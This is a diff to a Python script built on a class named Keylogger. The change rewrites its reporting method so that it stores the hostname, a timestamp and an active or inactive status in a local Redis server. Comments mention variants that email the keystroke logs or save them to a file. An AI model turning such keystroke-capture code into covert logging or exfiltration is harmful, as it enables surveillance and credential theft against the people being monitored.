@@ -4,16 +4,17 @@ import keyboard
 from threading import Timer
 from datetime import datetime
 
-SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
+SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
 
 redis = redis.Redis('localhost')
 hostname = socket.gethostname()
+
 
 class Keylogger:
     def __init__(self, interval):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
-        # this is the string variable that contains the log of all 
+        # this is the string variable that contains the log of all
         # the keystrokes within `self.interval`
         self.log = ""
         # record start & end datetimes
@@ -45,11 +46,19 @@ class Keylogger:
         self.log += name
 
     def send_to_redis(self):
+        data = {
+            'host': hostname,
+            'datetime': datetime.now().__str__(),
+            'activity': "inactive"
+        }
         if (self.log != ''):
-            redis.rpush('activity', f' Host: {hostname} - {datetime.now().__str__()} - active')           
+            data["activity"] = "active"
+            redis.json().set(
+                'activity', '$', data)
         else:
-            redis.rpush('activity', f' Host: {hostname} - {datetime.now().__str__()} - inactive')
-                
+            redis.json().set(
+                'activity', '$', data)
+
     def report(self):
         """
         This function gets called every `self.interval`
@@ -58,7 +67,7 @@ class Keylogger:
         # if there is something in log, report it
         self.end_dt = datetime.now()
         # update `self.filename`
-        # self.update_filename()      
+        # self.update_filename()
         self.send_to_redis()
         # if you don't want to print in the console, comment below line
         self.start_dt = datetime.now()
@@ -83,7 +92,7 @@ class Keylogger:
 if __name__ == "__main__":
     # if you want a keylogger to send to your email
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # if you want a keylogger to record keylogs to a local file 
+    # if you want a keylogger to record keylogs to a local file
     # (and then send it using your favorite method)
     keylogger = Keylogger(interval=10)
     keylogger.start()
